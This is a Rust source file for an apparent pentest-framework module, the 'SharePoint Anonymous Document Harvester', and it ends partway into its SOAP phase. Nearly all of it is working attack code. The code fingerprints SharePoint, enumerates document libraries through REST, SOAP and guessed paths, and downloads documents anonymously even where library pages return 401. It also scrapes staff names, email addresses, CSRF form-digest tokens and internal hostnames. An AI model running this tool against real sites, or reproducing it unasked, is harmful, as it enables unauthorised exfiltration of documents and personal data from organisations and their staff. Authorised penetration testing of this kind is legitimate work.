//! SharePoint Anonymous Document Harvester
//!
//! Automates anonymous document harvesting from SharePoint sites. Replicates
//! the technique that exfiltrated 340 documents (136.7 MB) anonymously from
//! 6 document libraries even though the library index returned 401.
//!
//! Phases:
//!   1. Detect SharePoint version (headers, _api, _vti_pvt, SOAP)
//!   2. Enumerate document libraries (common paths, _api/web/lists, SOAP)
//!   3. Harvest accessible documents (link scraping, URL patterns)
//!   4. Extract metadata (staff names, emails, CSRF tokens, internal hosts)
//!   5. SOAP information gathering (unauthenticated operations)

use anyhow::{Context, Result};
use colored::*;
use std::time::Duration;

use crate::module::{Finding, FindingKind, ModuleCtx, ModuleOutcome};
use crate::module_info::{ModuleInfo, ModuleRank};
use crate::utils::{
    cfg_prompt_default, cfg_prompt_port, cfg_prompt_yes_no,
    cfg_prompt_output_file, normalize_target, build_http_client,
};

/// Common SharePoint document library paths to probe.
const LIBRARY_PATHS: &[&str] = &[
    "/Quotations/",
    "/Tenders/",
    "/Vacancies/",
    "/Notices/",
    "/Documents/",
    "/Award%20List/",
    "/Shared%20Documents/",
    "/SiteAssets/",
    "/Pages/",
];

/// Document file extensions we look for in link scraping.
const DOC_EXTENSIONS: &[&str] = &[".pdf", ".docx", ".xlsx", ".pptx", ".doc", ".xls", ".ppt"];

/// SOAP envelope template for GetSiteAndWeb.
const SOAP_GET_SITE_AND_WEB: &str = r#"<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xmlns:xsd="http://www.w3.org/2001/XMLSchema"
               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetSiteAndWeb xmlns="http://schemas.microsoft.com/sharepoint/soap/">
      <strUrl>{url}</strUrl>
    </GetSiteAndWeb>
  </soap:Body>
</soap:Envelope>"#;

/// SOAP envelope template for GetSiteUrl.
const SOAP_GET_SITE_URL: &str = r#"<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xmlns:xsd="http://www.w3.org/2001/XMLSchema"
               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetSiteUrl xmlns="http://schemas.microsoft.com/sharepoint/soap/">
      <Url>{url}</Url>
    </GetSiteUrl>
  </soap:Body>
</soap:Envelope>"#;

/// SOAP envelope template for WebUrlFromPageUrl.
const SOAP_WEB_URL_FROM_PAGE: &str = r#"<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xmlns:xsd="http://www.w3.org/2001/XMLSchema"
               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <WebUrlFromPageUrl xmlns="http://schemas.microsoft.com/sharepoint/soap/">
      <pageUrl>{url}</pageUrl>
    </WebUrlFromPageUrl>
  </soap:Body>
</soap:Envelope>"#;

/// SOAP envelope for Authentication.asmx Mode.
const SOAP_AUTH_MODE: &str = r#"<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xmlns:xsd="http://www.w3.org/2001/XMLSchema"
               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Mode xmlns="http://schemas.microsoft.com/sharepoint/soap/" />
  </soap:Body>
</soap:Envelope>"#;

/// SOAP envelope template for sitedata.asmx GetList.
const SOAP_GET_LIST: &str = r#"<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xmlns:xsd="http://www.w3.org/2001/XMLSchema"
               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetList xmlns="http://schemas.microsoft.com/sharepoint/soap/">
      <strListName>{list_name}</strListName>
    </GetList>
  </soap:Body>
</soap:Envelope>"#;

fn banner() {
    if crate::utils::is_batch_mode() {
        return;
    }
    crate::mprintln!(
        "{}",
        "╔══════════════════════════════════════════════════════════════╗".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   SharePoint Anonymous Document Harvester                    ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   Enumerate & harvest docs from unauth SharePoint access    ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "╚══════════════════════════════════════════════════════════════╝".cyan()
    );
    crate::mprintln!();
}

pub fn info() -> ModuleInfo {
    ModuleInfo {
        name: "SharePoint Anonymous Document Harvester".to_string(),
        description:
            "Automates anonymous document harvesting from SharePoint sites. Detects SharePoint \
             version, enumerates document libraries, harvests accessible documents even when \
             library indexes return 401, extracts metadata (staff names, emails, CSRF tokens, \
             internal hostnames), and performs unauthenticated SOAP information gathering."
                .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![
            "https://www.yourpentest.co.uk/blog/sharepoint-anonymous-access/".to_string(),
            "https://learn.microsoft.com/en-us/sharepoint/change-external-sharing-site"
                .to_string(),
            "https://www.blackhillsinfosec.com/spoiling-sharepoint/".to_string(),
            "https://github.com/nyxgeek/o365recon".to_string(),
        ],
        disclosure_date: None,
        rank: ModuleRank::Excellent,
        default_port: Some(443),
    }
}

/// Build the base URL with scheme from target and port.
fn build_base_url(target: &str, port: u16, use_tls: bool) -> String {
    let scheme = if use_tls { "https" } else { "http" };
    if port == 443 && use_tls {
        format!("{}://{}", scheme, target)
    } else if port == 80 && !use_tls {
        format!("{}://{}", scheme, target)
    } else {
        format!("{}://{}:{}", scheme, target, port)
    }
}

/// Extract document links from HTML content.
fn extract_doc_links(html: &str, base_url: &str) -> Vec<String> {
    let mut links = Vec::new();
    // Simple href extraction - look for href="..." containing document extensions
    for cap in html.split("href=\"").skip(1) {
        if let Some(end) = cap.find('"') {
            let href = &cap[..end];
            let lower = href.to_lowercase();
            if DOC_EXTENSIONS.iter().any(|ext| lower.ends_with(ext)) {
                let full_url = if href.starts_with("http://") || href.starts_with("https://") {
                    href.to_string()
                } else if href.starts_with('/') {
                    format!("{}{}", base_url, href)
                } else {
                    format!("{}/{}", base_url, href)
                };
                if !links.contains(&full_url) {
                    links.push(full_url);
                }
            }
        }
    }
    // Also check href='...' (single quotes)
    for cap in html.split("href='").skip(1) {
        if let Some(end) = cap.find('\'') {
            let href = &cap[..end];
            let lower = href.to_lowercase();
            if DOC_EXTENSIONS.iter().any(|ext| lower.ends_with(ext)) {
                let full_url = if href.starts_with("http://") || href.starts_with("https://") {
                    href.to_string()
                } else if href.starts_with('/') {
                    format!("{}{}", base_url, href)
                } else {
                    format!("{}/{}", base_url, href)
                };
                if !links.contains(&full_url) {
                    links.push(full_url);
                }
            }
        }
    }
    links
}

/// Extract email addresses from text content.
fn extract_emails(text: &str) -> Vec<String> {
    let mut emails = Vec::new();
    // Simple email regex-like extraction
    let words: Vec<&str> = text.split_whitespace().collect();
    for word in words {
        let cleaned = word.trim_matches(|c: char| !c.is_alphanumeric() && c != '@' && c != '.' && c != '-' && c != '_');
        if cleaned.contains('@') && cleaned.contains('.') {
            let parts: Vec<&str> = cleaned.split('@').collect();
            if parts.len() == 2 && !parts[0].is_empty() && parts[1].contains('.') {
                if !emails.contains(&cleaned.to_string()) {
                    emails.push(cleaned.to_string());
                }
            }
        }
    }
    emails
}

/// Extract Form Digest (CSRF) tokens from page source.
fn extract_form_digest(html: &str) -> Vec<String> {
    let mut digests = Vec::new();
    // Look for __REQUESTDIGEST or formDigestValue
    for pattern in &["__REQUESTDIGEST\" value=\"", "formDigestValue\":\"", "FormDigestValue\":\""] {
        for cap in html.split(pattern).skip(1) {
            let end_char = if pattern.ends_with("\"") { '"' } else { '"' };
            if let Some(end) = cap.find(end_char) {
                let token = &cap[..end];
                if !token.is_empty() && !digests.contains(&token.to_string()) {
                    digests.push(token.to_string());
                }
            }
        }
    }
    // Also look for input hidden with name="__REQUESTDIGEST"
    if let Some(idx) = html.find("name=\"__REQUESTDIGEST\"") {
        let snippet = &html[idx..std::cmp::min(idx + 300, html.len())];
        if let Some(val_start) = snippet.find("value=\"") {
            let after = &snippet[val_start + 7..];
            if let Some(end) = after.find('"') {
                let token = &after[..end];
                if !token.is_empty() && !digests.contains(&token.to_string()) {
                    digests.push(token.to_string());
                }
            }
        }
    }
    digests
}

/// Extract internal hostnames from page content (JS/CSS references, etc.).
fn extract_internal_hostnames(text: &str) -> Vec<String> {
    let mut hostnames = Vec::new();
    // Look for patterns like //hostname/ or http://hostname/ in internal references
    let prefixes = &["//", "http://", "https://"];
    for prefix in prefixes {
        for cap in text.split(prefix).skip(1) {
            // Get the hostname portion (up to / or " or ' or space)
            let end = cap.find(|c: char| c == '/' || c == '"' || c == '\'' || c == ' ' || c == '>' || c == '\\')
                .unwrap_or(cap.len());
            let hostname = &cap[..end];
            // Filter for internal-looking hostnames (contain dots, not public CDNs)
            if hostname.contains('.')
                && !hostname.is_empty()
                && hostname.len() < 100
                && !hostname.contains(' ')
                && !is_common_cdn(hostname)
                && looks_internal(hostname)
                && !hostnames.contains(&hostname.to_string())
            {
                hostnames.push(hostname.to_string());
            }
        }
    }
    hostnames
}

/// Check if a hostname is a common CDN/external service (not interesting).
fn is_common_cdn(host: &str) -> bool {
    let cdns = &[
        "googleapis.com", "gstatic.com", "cloudflare.com", "jquery.com",
        "bootstrapcdn.com", "cdnjs.cloudflare.com", "maxcdn.com",
        "fontawesome.com", "google.com", "microsoft.com", "azure.com",
        "sharepoint.com", "office.com", "office365.com", "microsoftonline.com",
        "akamai.net", "akamaized.net", "cloudfront.net", "amazonaws.com",
    ];
    let lower = host.to_lowercase();
    cdns.iter().any(|cdn| lower.ends_with(cdn) || lower == *cdn)
}

/// Heuristic: does this hostname look internal?
fn looks_internal(host: &str) -> bool {
    let lower = host.to_lowercase();
    // Internal indicators: .local, .internal, .corp, .lan, short names, RFC1918 patterns
    let internal_suffixes = &[".local", ".internal", ".corp", ".lan", ".intranet", ".ad"];
    if internal_suffixes.iter().any(|s| lower.ends_with(s)) {
        return true;
    }
    // Non-public TLDs or single-label names with dots (e.g. server01.dept)
    let parts: Vec<&str> = lower.split('.').collect();
    if parts.len() == 2 && parts[1].len() <= 4 && !["com", "org", "net", "edu", "gov", "io"].contains(&parts[1]) {
        return true;
    }
    // Names that look like internal servers
    let internal_patterns = &["srv", "server", "dc", "fs", "app", "web", "db", "mail", "exchange", "sp", "sharepoint"];
    if internal_patterns.iter().any(|p| lower.contains(p)) && !lower.ends_with(".com") {
        return true;
    }
    false
}

/// Extract potential staff names from document metadata hints in HTML.
fn extract_staff_names(text: &str) -> Vec<String> {
    let mut names = Vec::new();
    // Look for common SharePoint metadata patterns
    let patterns = &[
        "author\":",
        "Author\":",
        "Editor\":",
        "editor\":",
        "Created By\":",
        "Modified By\":",
        "ows_Author\":",
        "\"Author\":\"",
        "\"Editor\":\"",
    ];
    for pattern in patterns {
        for cap in text.split(pattern).skip(1) {
            // Extract the value
            let start = cap.find(|c: char| c.is_alphabetic()).unwrap_or(0);
            let after = &cap[start..];
            let end = after.find(|c: char| c == '"' || c == '<' || c == ',' || c == '}')
                .unwrap_or(after.len().min(60));
            let name = after[..end].trim();
            if !name.is_empty()
                && name.len() > 2
                && name.len() < 60
                && name.contains(' ')
                && !name.contains('\\')
                && !name.contains('/')
                && !names.contains(&name.to_string())
            {
                names.push(name.to_string());
            }
        }
    }
    names
}

pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    let target = ctx
        .target
        .as_single()
        .context("sharepoint_doc_harvest requires a single-host target")?;
    banner();

    // --- Configuration prompts ---
    let normalized = normalize_target(target)?;
    let port = cfg_prompt_port("port", "Target port", 443).await?;
    let use_tls = cfg_prompt_yes_no("tls", "Use TLS (HTTPS)?", port == 443).await?;
    let base_url = cfg_prompt_default(
        "base_url",
        "Base URL",
        &build_base_url(&normalized, port, use_tls),
    )
    .await?;
    let download_files = cfg_prompt_yes_no("download", "Download accessible documents?", true).await?;
    let output_dir = if download_files {
        cfg_prompt_output_file("output_dir", "Output directory for harvested files", "sp_harvest_output").await?
    } else {
        String::new()
    };
    let timeout_secs: u64 = 15;

    let client = build_http_client(Duration::from_secs(timeout_secs))?;
    let mut outcome = ModuleOutcome::ok();
    let mut total_docs: usize = 0;
    let mut total_bytes: u64 = 0;
    let mut all_doc_urls: Vec<String> = Vec::new();
    let mut all_emails: Vec<String> = Vec::new();
    let mut all_names: Vec<String> = Vec::new();
    let mut all_hostnames: Vec<String> = Vec::new();
    let mut all_digests: Vec<String> = Vec::new();
    let mut accessible_libraries: Vec<String> = Vec::new();

    crate::mprintln!("{}", format!("[*] Target: {}", base_url).cyan());
    crate::mprintln!("{}", format!("[*] Port:   {}", port).cyan());
    crate::mprintln!();

    // ================================================================
    // PHASE 1: Detect SharePoint version
    // ================================================================
    crate::mprintln!("{}", "[Phase 1] Detecting SharePoint version...".bold().cyan());

    ctx.rate_limit(&normalized).await;
    let mut sp_version = String::new();

    // GET / and check MicrosoftSharePointTeamServices header
    match client.get(&base_url).send().await {
        Ok(resp) => {
            if let Some(sp_header) = resp.headers().get("MicrosoftSharePointTeamServices") {
                if let Ok(val) = sp_header.to_str() {
                    sp_version = val.to_string();
                    crate::mprintln!(
                        "{}",
                        format!("[+] SharePoint version (header): {}", val).green()
                    );
                    outcome.findings.push(Finding {
                        target: target.to_string(),
                        kind: FindingKind::Banner,
                        message: format!("SharePoint version detected: {}", val),
                        data: None,
                    });
                }
            }
            // Check X-SharePointHealthScore header (indicates SP)
            if let Some(health) = resp.headers().get("X-SharePointHealthScore") {
                if let Ok(val) = health.to_str() {
                    crate::mprintln!(
                        "{}",
                        format!("[+] X-SharePointHealthScore: {}", val).green()
                    );
                }
            }
        }
        Err(e) => {
            crate::mprintln!("{}", format!("[-] Root request failed: {}", e).red());
        }
    }

    // Try /_api/web/RegionalSettings for version info
    ctx.rate_limit(&normalized).await;
    let api_url = format!("{}/_api/web/RegionalSettings", base_url);
    match client
        .get(&api_url)
        .header("Accept", "application/json")
        .send()
        .await
    {
        Ok(resp) => {
            let status = resp.status();
            if status.is_success() {
                crate::mprintln!(
                    "{}",
                    format!("[+] /_api/web/RegionalSettings accessible ({})", status).green()
                );
                if let Ok(body) = crate::utils::network::read_http_body_text_capped(resp, crate::utils::safe_io::DEFAULT_BODY_CAP).await {
                    outcome.findings.push(Finding {
                        target: target.to_string(),
                        kind: FindingKind::Note,
                        message: format!(
                            "SharePoint REST API accessible anonymously: /_api/web/RegionalSettings"
                        ),
                        data: Some(serde_json::json!({ "status": status.as_u16() })),
                    });
                    // Extract metadata from API response
                    let emails = extract_emails(&body);
                    for e in emails {
                        if !all_emails.contains(&e) {
                            all_emails.push(e);
                        }
                    }
                }
            } else {
                crate::mprintln!(
                    "{}",
                    format!("[*] /_api/web/RegionalSettings: {}", status).dimmed()
                );
            }
        }
        Err(e) => {
            crate::mprintln!(
                "{}",
                format!("[-] /_api/web/RegionalSettings error: {}", e).dimmed()
            );
        }
    }

    // Try /_vti_pvt/service.cnf for version
    ctx.rate_limit(&normalized).await;
    let vti_url = format!("{}/_vti_pvt/service.cnf", base_url);
    match client.get(&vti_url).send().await {
        Ok(resp) if resp.status().is_success() => {
            if let Ok(body) = crate::utils::network::read_http_body_text_capped(resp, crate::utils::safe_io::DEFAULT_BODY_CAP).await {
                crate::mprintln!(
                    "{}",
                    format!("[+] /_vti_pvt/service.cnf accessible").green()
                );
                for line in body.lines() {
                    if line.starts_with("vti_extenderversion:") {
                        let ver = line.replace("vti_extenderversion:", "").trim().to_string();
                        if sp_version.is_empty() {
                            sp_version = ver.clone();
                        }
                        crate::mprintln!(
                            "{}",
                            format!("[+] Extender version: {}", ver).green()
                        );
                        outcome.findings.push(Finding {
                            target: target.to_string(),
                            kind: FindingKind::Banner,
                            message: format!("SharePoint extender version: {}", ver),
                            data: None,
                        });
                    }
                }
            }
        }
        _ => {
            crate::mprintln!("{}", "[*] /_vti_pvt/service.cnf not accessible".dimmed());
        }
    }

    // SOAP: sitedata.asmx GetSiteAndWeb
    ctx.rate_limit(&normalized).await;
    let sitedata_url = format!("{}/_vti_bin/sitedata.asmx", base_url);
    let soap_body = SOAP_GET_SITE_AND_WEB.replace("{url}", &base_url);
    match client
        .post(&sitedata_url)
        .header("Content-Type", "text/xml; charset=utf-8")
        .header(
            "SOAPAction",
            "http://schemas.microsoft.com/sharepoint/soap/GetSiteAndWeb",
        )
        .body(soap_body)
        .send()
        .await
    {
        Ok(resp) => {
            let status = resp.status();
            if status.is_success() {
                if let Ok(body) = crate::utils::network::read_http_body_text_capped(resp, crate::utils::safe_io::DEFAULT_BODY_CAP).await {
                    crate::mprintln!(
                        "{}",
                        "[+] sitedata.asmx GetSiteAndWeb responded".green()
                    );
                    // Extract GUID or site info
                    if body.contains("<strSite>") || body.contains("<strWeb>") {
                        outcome.findings.push(Finding {
                            target: target.to_string(),
                            kind: FindingKind::Note,
                            message: "SOAP GetSiteAndWeb accessible anonymously - site collection info leaked".to_string(),
                            data: Some(serde_json::json!({
                                "endpoint": sitedata_url,
                                "response_snippet": body.chars().take(500).collect::<String>()
                            })),
                        });
                    }
                }
            } else {
                crate::mprintln!(
                    "{}",
                    format!("[*] sitedata.asmx GetSiteAndWeb: {}", status).dimmed()
                );
            }
        }
        Err(e) => {
            crate::mprintln!(
                "{}",
                format!("[-] sitedata.asmx error: {}", e).dimmed()
            );
        }
    }

    if sp_version.is_empty() {
        crate::mprintln!(
            "{}",
            "[!] Could not determine SharePoint version - continuing anyway".yellow()
        );
    }

    crate::mprintln!();

    // ================================================================
    // PHASE 2: Enumerate document libraries
    // ================================================================
    crate::mprintln!(
        "{}",
        "[Phase 2] Enumerating document libraries...".bold().cyan()
    );

    // Try /_api/web/lists for list enumeration
    ctx.rate_limit(&normalized).await;
    let lists_url = format!("{}/_api/web/lists", base_url);
    match client
        .get(&lists_url)
        .header("Accept", "application/json")
        .send()
        .await
    {
        Ok(resp) if resp.status().is_success() => {
            if let Ok(body) = crate::utils::network::read_http_body_text_capped(resp, crate::utils::safe_io::DEFAULT_BODY_CAP).await {
                crate::mprintln!(
                    "{}",
                    "[+] /_api/web/lists accessible - full list enumeration!".green().bold()
                );
                outcome.findings.push(Finding {
                    target: target.to_string(),
                    kind: FindingKind::Vulnerable,
                    message: "SharePoint /_api/web/lists accessible anonymously - full list enumeration possible".to_string(),
                    data: Some(serde_json::json!({ "endpoint": lists_url })),
                });
                // Extract list names from JSON
                for segment in body.split("\"Title\":\"").skip(1) {
                    if let Some(end) = segment.find('"') {
                        let title = &segment[..end];
                        crate::mprintln!(
                            "{}",
                            format!("    [list] {}", title).green()
                        );
                    }
                }
                // Also extract metadata from the response
                let emails = extract_emails(&body);
                for e in emails {
                    if !all_emails.contains(&e) {
                        all_emails.push(e);
                    }
                }
            }
        }
        Ok(resp) => {
            crate::mprintln!(
                "{}",
                format!("[*] /_api/web/lists: {}", resp.status()).dimmed()
            );
        }
        Err(e) => {
            crate::mprintln!("{}", format!("[-] /_api/web/lists error: {}", e).dimmed());
        }
    }

    // Probe each common library path
    for lib_path in LIBRARY_PATHS {
        if ctx.is_cancelled() {
            break;
        }
        ctx.rate_limit(&normalized).await;

        let lib_url = format!("{}{}", base_url, lib_path);
        let allitems_url = format!("{}Forms/AllItems.aspx", lib_url);

        // Try AllItems.aspx first
        let mut lib_accessible = false;
        let mut page_content = String::new();

        match client.get(&allitems_url).send().await {
            Ok(resp) => {
                let status = resp.status();
                if status.is_success() {
                    lib_accessible = true;
                    if let Ok(body) = crate::utils::network::read_http_body_text_capped(resp, crate::utils::safe_io::DEFAULT_BODY_CAP).await {
                        page_content = body;
                    }
                    crate::mprintln!(
                        "{}",
                        format!("[+] {} AllItems.aspx accessible ({})", lib_path, status).green()
                    );
                } else if status.as_u16() == 401 || status.as_u16() == 403 {
                    crate::mprintln!(
                        "{}",
                        format!("[*] {} AllItems.aspx: {} (will try direct file access)", lib_path, status).yellow()
                    );
                } else {
                    crate::mprintln!(
                        "{}",
                        format!("[*] {} AllItems.aspx: {}", lib_path, status).dimmed()
                    );
                }
            }
            Err(_) => {}
        }

        // Try the library root directly
        if !lib_accessible {
            ctx.rate_limit(&normalized).await;
            match client.get(&lib_url).send().await {
                Ok(resp) => {
                    let status = resp.status();
                    if status.is_success() {
                        lib_accessible = true;
                        if let Ok(body) = crate::utils::network::read_http_body_text_capped(resp, crate::utils::safe_io::DEFAULT_BODY_CAP).await {
                            page_content = body;
                        }
                        crate::mprintln!(
                            "{}",
                            format!("[+] {} root accessible ({})", lib_path, status).green()
                        );
                    }
                }
                Err(_) => {}
            }
        }

        if lib_accessible {
            accessible_libraries.push(lib_path.to_string());
        }

        // Extract document links from any page content we retrieved
        if !page_content.is_empty() {
            let links = extract_doc_links(&page_content, &base_url);
            for link in &links {
                if !all_doc_urls.contains(link) {
                    all_doc_urls.push(link.clone());
                }
            }
            // Extract metadata
            let emails = extract_emails(&page_content);
            for e in emails {
                if !all_emails.contains(&e) {
                    all_emails.push(e);
                }
            }
            let names = extract_staff_names(&page_content);
            for n in names {
                if !all_names.contains(&n) {
                    all_names.push(n);
                }
            }
            let digests = extract_form_digest(&page_content);
            for d in digests {
                if !all_digests.contains(&d) {
                    all_digests.push(d);
                }
            }
            let hostnames = extract_internal_hostnames(&page_content);
            for h in hostnames {
                if !all_hostnames.contains(&h) {
                    all_hostnames.push(h);
                }
            }
        }

        // SOAP: Try GetList for each library
        ctx.rate_limit(&normalized).await;
        let list_name = lib_path.trim_matches('/').replace("%20", " ");
        let soap_body = SOAP_GET_LIST.replace("{list_name}", &list_name);
        match client
            .post(&sitedata_url)
            .header("Content-Type", "text/xml; charset=utf-8")
            .header(
                "SOAPAction",
                "http://schemas.microsoft.com/sharepoint/soap/GetList",
            )
            .body(soap_body)
            .send()
            .await
        {
            Ok(resp) if resp.status().is_success() => {
                if let Ok(body) = crate::utils::network::read_http_body_text_capped(resp, crate::utils::safe_io::DEFAULT_BODY_CAP).await {
                    if body.contains("<sListMetadata>") || body.contains("<GetListResult>") {
                        crate::mprintln!(
                            "{}",
                            format!("[+] SOAP GetList '{}' returned data", list_name).green()
                        );
                        // Extract doc links from SOAP response
                        let links = extract_doc_links(&body, &base_url);
                        for link in links {
                            if !all_doc_urls.contains(&link) {
                                all_doc_urls.push(link);
                            }
                        }
                        if !accessible_libraries.contains(&lib_path.to_string()) {
                            accessible_libraries.push(lib_path.to_string());
                        }
                    }
                }
            }
            _ => {}
        }
    }

    crate::mprintln!();

    // ================================================================
    // PHASE 3: Harvest accessible documents
    // ================================================================
    crate::mprintln!(
        "{}",
        "[Phase 3] Harvesting accessible documents...".bold().cyan()
    );

    // Create output directory if downloading
    if download_files && !output_dir.is_empty() {
        if let Err(e) = std::fs::create_dir_all(&output_dir) {
            crate::mprintln!(
                "{}",
                format!("[!] Failed to create output dir: {}", e).yellow()
            );
        }
    }

    // Attempt to access each discovered document URL
    let doc_urls_to_try = all_doc_urls.clone();
    for doc_url in &doc_urls_to_try {
        if ctx.is_cancelled() {
            break;
        }
        ctx.rate_limit(&normalized).await;

        match client.head(doc_url).send().await {
            Ok(resp) => {
                let status = resp.status();
                if status.is_success() {
                    let content_length = resp
                        .headers()
                        .get("content-length")
                        .and_then(|v| v.to_str().ok())
                        .and_then(|v| v.parse::<u64>().ok())
                        .unwrap_or(0);

                    total_docs += 1;
                    total_bytes += content_length;

                    crate::mprintln!(
                        "{}",
                        format!(
                            "[+] ACCESSIBLE: {} ({} bytes)",
                            doc_url, content_length
                        )
                        .green()
                    );

                    // Download if requested
                    if download_files && !output_dir.is_empty() {
                        ctx.rate_limit(&normalized).await;
                        match client.get(doc_url).send().await {
                            Ok(dl_resp) if dl_resp.status().is_success() => {
                                let filename = doc_url
                                    .rsplit('/')
                                    .next()
                                    .unwrap_or("unknown")
                                    .replace("%20", "_");
                                let filepath =
                                    format!("{}/{}", output_dir, filename);
                                if let Ok(bytes) = crate::utils::safe_io::read_http_body_capped(dl_resp, crate::utils::safe_io::DEFAULT_BODY_CAP).await {
                                    total_bytes = total_bytes
                                        .saturating_sub(content_length)
                                        + bytes.len() as u64;
                                    if let Err(e) = std::fs::write(&filepath, &bytes) {
                                        crate::mprintln!(
                                            "{}",
                                            format!("    [-] Write error: {}", e).red()
                                        );
                                    } else {
                                        crate::mprintln!(
                                            "{}",
                                            format!(
                                                "    [+] Saved: {} ({} bytes)",
                                                filepath,
                                                bytes.len()
                                            )
                                            .green()
                                        );
                                    }
                                }
                            }
                            _ => {}
                        }
                    }
                } else {
                    crate::mprintln!(
                        "{}",
                        format!("[*] {}: {}", doc_url, status).dimmed()
                    );
                }
            }
            Err(e) => {
                crate::mprintln!(
                    "{}",
                    format!("[-] {}: {}", doc_url, e).dimmed()
                );
            }
        }
    }

    // Also try some common filename patterns in accessible libraries
    let common_filenames = &[
        "Policy.pdf",
        "Procedure.pdf",
        "Tender.pdf",
        "Notice.pdf",
        "Annual_Report.pdf",
        "Budget.xlsx",
        "Contacts.xlsx",
        "Staff_List.xlsx",
        "Organogram.pdf",
        "Bid.pdf",
    ];

    for lib_path in &accessible_libraries {
        for filename in common_filenames {
            if ctx.is_cancelled() {
                break;
            }
            ctx.rate_limit(&normalized).await;

            let file_url = format!("{}{}{}", base_url, lib_path, filename);
            if all_doc_urls.contains(&file_url) {
                continue;
            }

            match client.head(&file_url).send().await {
                Ok(resp) if resp.status().is_success() => {
                    let content_length = resp
                        .headers()
                        .get("content-length")
                        .and_then(|v| v.to_str().ok())
                        .and_then(|v| v.parse::<u64>().ok())
                        .unwrap_or(0);

                    total_docs += 1;
                    total_bytes += content_length;
                    all_doc_urls.push(file_url.clone());

                    crate::mprintln!(
                        "{}",
                        format!(
                            "[+] FOUND: {} ({} bytes)",
                            file_url, content_length
                        )
                        .green()
                    );

                    if download_files && !output_dir.is_empty() {
                        ctx.rate_limit(&normalized).await;
                        match client.get(&file_url).send().await {
                            Ok(dl_resp) if dl_resp.status().is_success() => {
                                let filepath = format!("{}/{}", output_dir, filename);
                                if let Ok(bytes) = crate::utils::safe_io::read_http_body_capped(dl_resp, crate::utils::safe_io::DEFAULT_BODY_CAP).await {
                                    if let Err(e) = std::fs::write(&filepath, &bytes) {
                                        crate::mprintln!(
                                            "{}",
                                            format!("    [-] Write error: {}", e).red()
                                        );
                                    } else {
                                        crate::mprintln!(
                                            "{}",
                                            format!("    [+] Saved: {}", filepath).green()
                                        );
                                    }
                                }
                            }
                            _ => {}
                        }
                    }
                }
                _ => {}
            }
        }
    }

    crate::mprintln!();

    // ================================================================
    // PHASE 4: Extract metadata
    // ================================================================
    crate::mprintln!(
        "{}",
        "[Phase 4] Extracting metadata...".bold().cyan()
    );

    // Scan additional pages for metadata if we haven't already
    let metadata_pages = &[
        "/_layouts/viewlsts.aspx",
        "/_layouts/settings.aspx",
        "/default.aspx",
        "/Pages/default.aspx",
        "/SitePages/Home.aspx",
        "/_layouts/people.aspx",
    ];

    for page in metadata_pages {
        if ctx.is_cancelled() {
            break;
        }
        ctx.rate_limit(&normalized).await;

        let page_url = format!("{}{}", base_url, page);
        match client.get(&page_url).send().await {
            Ok(resp) if resp.status().is_success() => {
                if let Ok(body) = crate::utils::network::read_http_body_text_capped(resp, crate::utils::safe_io::DEFAULT_BODY_CAP).await {
                    crate::mprintln!(
                        "{}",
                        format!("[+] {} accessible", page).green()
                    );
                    // Extract all metadata
                    let emails = extract_emails(&body);
                    for e in emails {
                        if !all_emails.contains(&e) {
                            all_emails.push(e);
                        }
                    }
                    let names = extract_staff_names(&body);
                    for n in names {
                        if !all_names.contains(&n) {
                            all_names.push(n);
                        }
                    }
                    let digests = extract_form_digest(&body);
                    for d in digests {
                        if !all_digests.contains(&d) {
                            all_digests.push(d);
                        }
                    }
                    let hostnames = extract_internal_hostnames(&body);
                    for h in hostnames {
                        if !all_hostnames.contains(&h) {
                            all_hostnames.push(h);
                        }
                    }
                }
            }
            _ => {}
        }
    }

    // Report extracted metadata
    if !all_emails.is_empty() {
        crate::mprintln!("{}", "[+] Extracted email addresses:".green().bold());
        for email in &all_emails {
            crate::mprintln!("    {}", email.yellow());
        }
        outcome.findings.push(Finding {
            target: target.to_string(),
            kind: FindingKind::Note,
            message: format!("Email addresses extracted: {}", all_emails.join(", ")),
            data: Some(serde_json::json!({ "emails": all_emails })),
        });
    }

    if !all_names.is_empty() {
        crate::mprintln!("{}", "[+] Extracted staff names:".green().bold());
        for name in &all_names {
            crate::mprintln!("    {}", name.yellow());
        }
        outcome.findings.push(Finding {
            target: target.to_string(),
            kind: FindingKind::Note,
            message: format!("Staff names extracted: {}", all_names.join(", ")),
            data: Some(serde_json::json!({ "names": all_names })),
        });
    }

    if !all_digests.is_empty() {
        crate::mprintln!("{}", "[+] Form Digest (CSRF) tokens found:".green().bold());
        for digest in &all_digests {
            crate::mprintln!("    {}", digest.yellow());
        }
        outcome.findings.push(Finding {
            target: target.to_string(),
            kind: FindingKind::Vulnerable,
            message: format!(
                "Form Digest CSRF tokens exposed anonymously ({} found)",
                all_digests.len()
            ),
            data: Some(serde_json::json!({ "digests": all_digests })),
        });
    }

    if !all_hostnames.is_empty() {
        crate::mprintln!("{}", "[+] Internal hostnames leaked:".green().bold());
        for host in &all_hostnames {
            crate::mprintln!("    {}", host.yellow());
        }
        outcome.findings.push(Finding {
            target: target.to_string(),
            kind: FindingKind::Note,
            message: format!("Internal hostnames leaked: {}", all_hostnames.join(", ")),
            data: Some(serde_json::json!({ "hostnames": all_hostnames })),
        });
    }

    crate::mprintln!();

    // ================================================================
    // PHASE 5: SOAP Information Gathering
    // ================================================================
    crate::mprintln!(
        "{}",
        "[Phase 5] SOAP information gathering...".bold().cyan()
    );

    // sitedata.asmx GetSiteUrl
